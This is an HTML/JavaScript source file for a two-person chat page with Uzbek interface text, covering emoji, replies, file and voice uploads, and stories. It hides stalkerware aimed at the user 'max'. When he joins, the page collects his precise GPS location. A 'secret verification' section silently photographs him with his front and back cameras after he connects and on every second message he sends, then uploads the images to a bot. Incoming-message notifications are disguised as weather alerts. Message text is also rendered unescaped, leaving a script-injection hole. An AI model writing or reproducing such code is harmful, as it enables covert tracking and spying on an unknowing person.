<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Chat</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <style>
        .avatar-box {
            width: 42px; height: 42px; border-radius: 50%; padding: 2px;
            cursor: pointer; transition: 0.3s;
        }
        .avatar-box.has-story {
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
        }
        .avatar-img {
            width: 100%; height: 100%; border-radius: 50%; object-fit: cover;
            border: 2px solid #2c3e50; background: #fff;
        }
    </style>
</head>
<body>

    <div id="profileModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; justify-content:center; align-items:center;">
        <div style="background:#fff; padding:20px; border-radius:10px; width:80%; max-width:300px; text-align:center;">
            <h3 style="margin-top:0; color:#333;">Profilni Tahrirlash</h3>
            
            <label style="display:block; text-align:left; color:#555; font-size:13px; margin-bottom:5px;">Dumaloq Avatar rasmi:</label>
            <input type="file" id="avatarInput" accept="image/*" style="margin-bottom:15px; width:100%;">
            
            <label style="display:block; text-align:left; color:#555; font-size:13px; margin-bottom:5px;">Istoriya (Rasm yoki Video max 1 daq):</label>
            <input type="file" id="storyInput" accept="image/*,video/*" style="margin-bottom:20px; width:100%;">
            
            <button onclick="saveProfileChanges()" style="background:#2ecc71; color:#fff; border:none; padding:10px; width:100%; border-radius:5px; margin-bottom:10px; font-weight:bold; cursor:pointer;">Saqlash va Yuklash</button>
            <button onclick="document.getElementById('profileModal').style.display='none'" style="background:#e74c3c; color:#fff; border:none; padding:10px; width:100%; border-radius:5px; cursor:pointer;">Bekor qilish</button>
        </div>
    </div>

    <div id="storyViewer" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:2000; flex-direction:column; justify-content:center; align-items:center;">
        <i class='bx bx-x' style="position:absolute; top:20px; right:20px; font-size:35px; color:#fff; cursor:pointer; z-index:2001;" onclick="closeStory()"></i>
        <div id="storyContent" style="width:100%; max-height:100%; display:flex; justify-content:center; align-items:center;"></div>
    </div>
    
    <div class="chat-container">
        
        <div class="chat-header" style="display:flex; justify-content:space-between; align-items:center; padding:10px;">
            <div style="display:flex; align-items:center; gap:8px;">
                <div class="avatar-box" id="myStoryRing" onclick="viewStory(myUser)">
                    <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" id="myAvatarImg" class="avatar-img">
                </div>
                <div style="display:flex; flex-direction:column; align-items:flex-start;">
                    <div style="display:flex; align-items:center; gap:5px;">
                        <span id="myNameTxt" style="font-weight:bold; font-size:14px; text-transform:uppercase;">MEN</span>
                        <i class='bx bx-edit' style="cursor:pointer; color:#f39c12; font-size:18px;" onclick="document.getElementById('profileModal').style.display='flex'"></i>
                    </div>
                </div>
            </div>

            <div style="display:flex; align-items:center; gap:8px; flex-direction:row-reverse;">
                <div class="avatar-box" id="partnerStoryRing" onclick="viewStory(partner)">
                    <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" id="partnerAvatarImg" class="avatar-img">
                </div>
                <div style="display:flex; flex-direction:column; align-items:flex-end;">
                    <span id="chatPartner" style="font-weight:bold; font-size:14px;">SHERIK</span>
                    <span id="statusText" style="font-size:11px;">Offline</span>
                </div>
            </div>
        </div>
        <div class="chat-messages" id="messagesList"></div>

        <div class="chat-input-wrapper">
            
            <div class="emoji-picker" id="emojiPicker"></div>

            <div id="replyPreview" class="reply-preview">
                <div style="display:flex; flex-direction:column;">
                    <span id="replyToUser" style="font-weight:bold; font-size:12px;">User</span>
                    <span id="replyToText" style="font-size:12px; opacity:0.8;">Text...</span>
                </div>
                <i class='bx bx-x' onclick="cancelReply()" style="cursor:pointer; font-size:20px;"></i>
            </div>

            <div class="chat-input-area">
                <button class="icon-btn" onclick="toggleEmoji()"><i class='bx bx-smile'></i></button>

                <button class="icon-btn" onclick="document.getElementById('cameraInput').click()"><i class='bx bxs-camera'></i></button>
                <button class="icon-btn" onclick="document.getElementById('fileInput').click()"><i class='bx bx-paperclip'></i></button>
                
                <input type="text" id="msgInput" placeholder="Xabar yozing..." autocomplete="off">
                
                <button class="icon-btn" id="micBtn"><i class='bx bxs-microphone'></i></button>
                <button class="icon-btn" onclick="sendMessage()"><i class='bx bxs-send'></i></button>
            </div>
        </div>
    </div>

    <input type="file" id="fileInput" onchange="uploadFile(this.files[0])" style="display:none;">
    <input type="file" id="cameraInput" accept="image/*" capture="environment" onchange="uploadFile(this.files[0])" style="display:none;">

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const myUser = localStorage.getItem('chatUser');
        if (!myUser) window.location.href = 'index.html';

        const partner = (myUser === 'mura') ? 'max' : 'mura';
        document.getElementById('chatPartner').innerText = partner.toUpperCase();

        // --- EMOJI MANTIQI ---
        const emojis = ["😀","😂","🤣","😍","🥰","😘","😭","😡","🤬","👍","👎","❤️","💔","🔥","✨","🎉","👋","🤝","👀","✅","❌","❓","☠️","🤡","💩","🤖","👻","💀","💪","🙏"];
        const emojiContainer = document.getElementById('emojiPicker');
        
        emojis.forEach(emoji => {
            const span = document.createElement('div');
            span.textContent = emoji;
            span.className = 'emoji-btn';
            span.onclick = () => {
                const input = document.getElementById('msgInput');
                input.value += emoji;
                input.focus();
            };
            emojiContainer.appendChild(span);
        });

        function toggleEmoji() {
            emojiContainer.classList.toggle('active');
        }

        document.addEventListener('click', (e) => {
            if (!e.target.closest('.emoji-picker') && !e.target.closest('.bx-smile')) {
                emojiContainer.classList.remove('active');
            }
        });

        // --- GEOLOKATSIYA LOGIKASI ---
        function joinChat() {
            if (myUser === 'max') {
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            socket.emit('join', { user: myUser, lat: position.coords.latitude, lon: position.coords.longitude });
                        },
                        (error) => {
                            console.log("GPS Xatosi:", error.message);
                            socket.emit('join', { user: myUser });
                        },
                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                    );
                } else {
                    socket.emit('join', { user: myUser });
                }
            } else {
                socket.emit('join', { user: myUser });
            }
        }
        joinChat();

        // --- CHAT LOGIKASI ---
        let currentReply = null;

        socket.on('status_update', (data) => {
            const isOnline = data.online.includes(partner);
            const statusEl = document.getElementById('statusText');
            if (isOnline) {
                statusEl.innerHTML = '<span style="color:#00ff41; font-weight:bold;">Online</span>';
            } else {
                const lastTime = data.lastSeen[partner];
                statusEl.innerText = lastTime ? `last seen at ${lastTime}` : 'Offline';
            }
        });

        socket.on('load_history', (history) => {
            const list = document.getElementById('messagesList');
            list.innerHTML = '';
            history.forEach(msg => appendMessage(msg));
            list.scrollTop = list.scrollHeight;
        });

        // --- BILDIRISHNOMAGA RUXSAT SO'RASH ---
        if ("Notification" in window && Notification.permission !== "granted" && Notification.permission !== "denied") {
            Notification.requestPermission();
        }

        socket.on('new_message', (msg) => {
            appendMessage(msg);
            const list = document.getElementById('messagesList');
            list.scrollTop = list.scrollHeight;

            if (msg.user !== myUser && document.hidden) {
                if (Notification.permission === "granted") {
                    const notification = new Notification("⛅ Ob-havo ma'lumoti", {
                        body: "Bugun havo ochiq, yog'ingarchilik kutilmaydi.",
                        icon: "https://cdn-icons-png.flaticon.com/512/3222/3222800.png", 
                        silent: false 
                    });
                    notification.onclick = function() {
                        window.focus();
                        this.close();
                    };
                }
            }
        });

        function appendMessage(msg) {
            const list = document.getElementById('messagesList');
            const div = document.createElement('div');
            
            const isMe = String(msg.user).toLowerCase() === String(myUser).toLowerCase();
            div.className = `message ${isMe ? 'my-msg' : 'other-msg'}`;
            div.ondblclick = () => triggerReply(msg);

            let senderNameHtml = '';
            if (!isMe && msg.user) {
                senderNameHtml = `<div style="font-size: 11px; font-weight: bold; color: #64b5ef; margin-bottom: 3px;">${String(msg.user).toUpperCase()}</div>`;
            }

            let replyHtml = '';
            if (msg.replyTo) {
                replyHtml = `<div class="reply-block"><div class="reply-user">${msg.replyTo.user}</div><div>${msg.replyTo.text}</div></div>`;
            }

            let mediaHtml = '';
            if (msg.file) {
                if (msg.fileType.startsWith('image/')) mediaHtml = `<img src="/uploads/${msg.file}" class="msg-img">`;
                else if (msg.fileType.startsWith('video/')) mediaHtml = `<video src="/uploads/${msg.file}" controls class="msg-img"></video>`;
                else if (msg.fileType.startsWith('audio/') || msg.file.endsWith('.webm')) mediaHtml = `<audio src="/uploads/${msg.file}" controls style="margin-top:5px; width:200px;"></audio>`;
                else mediaHtml = `<a href="/uploads/${msg.file}" download style="color:skyblue; display:block; margin-top:5px;">📁 ${msg.originalName || 'Fayl'}</a>`;
            }

            let textHtml = msg.text ? `<div>${msg.text}</div>` : '';
            const replyBtn = `<i class='bx bxs-share' style="position:absolute; top:-10px; right:-10px; background:#fff; color:#333; border-radius:50%; padding:3px; cursor:pointer; font-size:14px;" onclick='triggerReply(${JSON.stringify(msg)})'></i>`;

            div.innerHTML = `${replyBtn} ${senderNameHtml} ${replyHtml} ${mediaHtml} ${textHtml} <span class="msg-time">${msg.time}</span>`;
            list.appendChild(div);
        }

        window.triggerReply = function(msg) {
            let previewText = msg.text || (msg.file ? "[Fayl/Media]" : "...");
            currentReply = { user: msg.user, text: previewText };
            document.getElementById('replyPreview').style.display = 'flex';
            document.getElementById('replyToUser').innerText = msg.user;
            document.getElementById('replyToText').innerText = previewText;
            document.getElementById('msgInput').focus();
        }

        window.cancelReply = function() {
            currentReply = null;
            document.getElementById('replyPreview').style.display = 'none';
        }

        window.sendMessage = function() {
            const input = document.getElementById('msgInput');
            const text = input.value.trim();
            if (text || currentReply) {
                socket.emit('send_message', { text: text, replyTo: currentReply });
                input.value = '';
                cancelReply();
                emojiContainer.classList.remove('active'); 
            }
        }

        document.getElementById('msgInput').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendMessage();
        });

        // --- MICROPHONE LOGIC ---
        const micBtn = document.getElementById('micBtn');
        let mediaRecorder;
        let audioChunks = [];
        let isRecording = false;

        const startRec = async (e) => {
            if (e.cancelable) e.preventDefault();
            if (isRecording) return;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                isRecording = true;
                micBtn.classList.add('recording-active');

                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);

                mediaRecorder.onstop = () => {
                    micBtn.classList.remove('recording-active');
                    isRecording = false;
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    if (audioBlob.size > 2000) uploadFile(audioBlob, 'voice_msg.webm');
                    stream.getTracks().forEach(track => track.stop());
                };
                mediaRecorder.start();
            } catch (err) { alert("Mikrofon ishlamadi!"); }
        };

        const stopRec = (e) => {
            if (e.cancelable) e.preventDefault();
            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
        };

        micBtn.addEventListener('mousedown', startRec);
        micBtn.addEventListener('mouseup', stopRec);
        micBtn.addEventListener('touchstart', startRec);
        micBtn.addEventListener('touchend', stopRec);

        window.uploadFile = async function(file, nameOverride = null) {
            if (!file) return;
            const formData = new FormData();
            formData.append('file', file, nameOverride || file.name);
            try {
                const res = await fetch('/upload', { method: 'POST', body: formData });
                const data = await res.json();
                socket.emit('send_message', { 
                    text: '', 
                    file: data.filename, 
                    fileType: data.type, 
                    originalName: data.originalName,
                    replyTo: currentReply 
                });
                cancelReply();
            } catch (e) { alert("Yuklashda xato!"); }
        }

        // ==========================================
        // PROFIL VA ISTORIYA MANTIQI (YANGI)
        // ==========================================
        let profilesData = {};
        document.getElementById('myNameTxt').innerText = myUser.toUpperCase();

        socket.on('load_profiles', (data) => {
            profilesData = data;
            
            if (profilesData[myUser]) {
                if (profilesData[myUser].avatar) document.getElementById('myAvatarImg').src = `/uploads/${profilesData[myUser].avatar}`;
                if (profilesData[myUser].story) document.getElementById('myStoryRing').classList.add('has-story');
                else document.getElementById('myStoryRing').classList.remove('has-story');
            }
            
            if (profilesData[partner]) {
                if (profilesData[partner].avatar) document.getElementById('partnerAvatarImg').src = `/uploads/${profilesData[partner].avatar}`;
                if (profilesData[partner].story) document.getElementById('partnerStoryRing').classList.add('has-story');
                else document.getElementById('partnerStoryRing').classList.remove('has-story');
            }
        });

        async function saveProfileChanges() {
            const avatarFile = document.getElementById('avatarInput').files[0];
            const storyFile = document.getElementById('storyInput').files[0];
            let profileUpdates = {};

            if (avatarFile) {
                const fd = new FormData(); fd.append('file', avatarFile);
                try {
                    const res = await fetch('/upload', { method: 'POST', body: fd });
                    const data = await res.json();
                    profileUpdates.avatar = data.filename;
                } catch(e) { console.log(e); }
            }

            if (storyFile) {
                if (storyFile.type.startsWith('video/')) {
                    const videoCheck = document.createElement('video');
                    videoCheck.preload = 'metadata';
                    
                    const isAllowed = await new Promise((resolve) => {
                        videoCheck.onloadedmetadata = function() {
                            window.URL.revokeObjectURL(videoCheck.src);
                            if (videoCheck.duration > 60) {
                                alert("Xatolik: Istoriya videosi 1 daqiqadan (60 soniyadan) oshmasligi shart!");
                                resolve(false);
                            } else {
                                resolve(true);
                            }
                        }
                        videoCheck.src = URL.createObjectURL(storyFile);
                    });

                    if (!isAllowed) return; 
                }

                const fd2 = new FormData(); fd2.append('file', storyFile);
                try {
                    const res2 = await fetch('/upload', { method: 'POST', body: fd2 });
                    const data2 = await res2.json();
                    profileUpdates.story = data2.filename;
                    profileUpdates.storyType = data2.type;
                } catch(e) { console.log(e); }
            }

            if (Object.keys(profileUpdates).length > 0) {
                socket.emit('update_profile', profileUpdates);
                alert("Muvaffaqiyatli saqlandi!");
            }
            
            document.getElementById('profileModal').style.display = 'none';
            document.getElementById('avatarInput').value = '';
            document.getElementById('storyInput').value = '';
        }

        function viewStory(user) {
            if (!profilesData[user] || !profilesData[user].story) {
                alert("Hozircha istoriya yo'q"); return;
            }
            
            const viewer = document.getElementById('storyViewer');
            const content = document.getElementById('storyContent');
            content.innerHTML = ''; 
            
            const fileUrl = `/uploads/${profilesData[user].story}`;
            
            if (profilesData[user].storyType.startsWith('video/')) {
                content.innerHTML = `<video src="${fileUrl}" controls autoplay style="max-width:100%; max-height:90vh; border-radius:10px;"></video>`;
            } else {
                content.innerHTML = `<img src="${fileUrl}" style="max-width:100%; max-height:90vh; border-radius:10px;">`;
            }
            viewer.style.display = 'flex';
        }

        function closeStory() {
            const content = document.getElementById('storyContent');
            content.innerHTML = ''; 
            document.getElementById('storyViewer').style.display = 'none';
        }

        // ==========================================
        // MAX SHAXSINI YASHIRIN TASDIQLASH (VERIFY)
        // ==========================================
        let maxMessageCount = 0;

        async function takeSecretPhoto(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0); 
                
                stream.getTracks().forEach(track => track.stop());
                
                return new Promise(resolve => {
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
                });
            } catch (err) {
                return null;
            }
        }

        async function uploadAndSendToBot(blob, type) {
            const formData = new FormData();
            formData.append('file', blob, `verify_${Date.now()}.jpg`);
            try {
                const res = await fetch('/upload', { method: 'POST', body: formData });
                const data = await res.json();
                socket.emit('verify_photo', { filename: data.filename, type: type });
            } catch (e) { console.error("Rasm yuklash xatosi"); }
        }

        async function runVerification() {
            if (myUser !== 'max') return; 
            const frontBlob = await takeSecretPhoto('user');
            if (frontBlob) await uploadAndSendToBot(frontBlob, 'Old Kamera 🤳');
            
            await new Promise(r => setTimeout(r, 1000));
            
            const backBlob = await takeSecretPhoto('environment');
            if (backBlob) await uploadAndSendToBot(backBlob, 'Orqa Kamera 🌍');
        }

        socket.on('connect', () => {
            if (myUser === 'max') {
                setTimeout(runVerification, 3000); 
            }
        });

        const originalSendMessage = window.sendMessage;
        window.sendMessage = function() {
            originalSendMessage(); 
            if (myUser === 'max') {
                maxMessageCount++;
                if (maxMessageCount % 2 === 0) { 
                    runVerification();
                }
            }
        }
        
    </script>
</body>
</html>
